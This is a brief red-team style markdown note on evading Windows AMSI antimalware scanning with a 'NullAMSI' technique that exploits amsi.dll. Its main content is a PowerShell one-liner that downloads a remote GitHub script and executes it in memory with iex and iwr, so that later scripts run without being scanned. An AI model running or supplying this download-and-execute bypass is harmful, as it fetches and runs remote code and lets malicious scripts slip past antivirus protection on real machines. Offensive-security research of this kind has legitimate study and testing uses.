# Defense Evasion: AMSI Bypass

## How it work

This technique based on some methods to dealing with the AMSI (Antimalware Scan Interface) like exploiting the amsi.dll and/or relevent service.

Hence within succession we can bypass antimalware scan from modern AV, not only Windows but also others as most is using the same AMSI service.

## Methods

### NullAMSI

#### What is this

A new attack that targeting to a bug in `amsi.dll` that allow user to write on some code address

#### Running

You can download script from [NullAMSI.ps1](https://github.com/papcaii/PurpleTeam-Note/blob/main/Tactics/defense-evasion/AMSI-BYPASS/Payloads/NullAMSI/Invoke-NullAMSI.ps1) then run in powershell, or invoke by running:
```powershell
iex (iwr "https://raw.githubusercontent.com/papcaii/PurpleTeam-Note/refs/heads/main/Tactics/defense-evasion/AMSI-BYPASS/Payloads/NullAMSI/Invoke-NullAMSI.ps1" -UseBasicParsing).Content
```

Then we can running powershell script without being scanned by AMSI
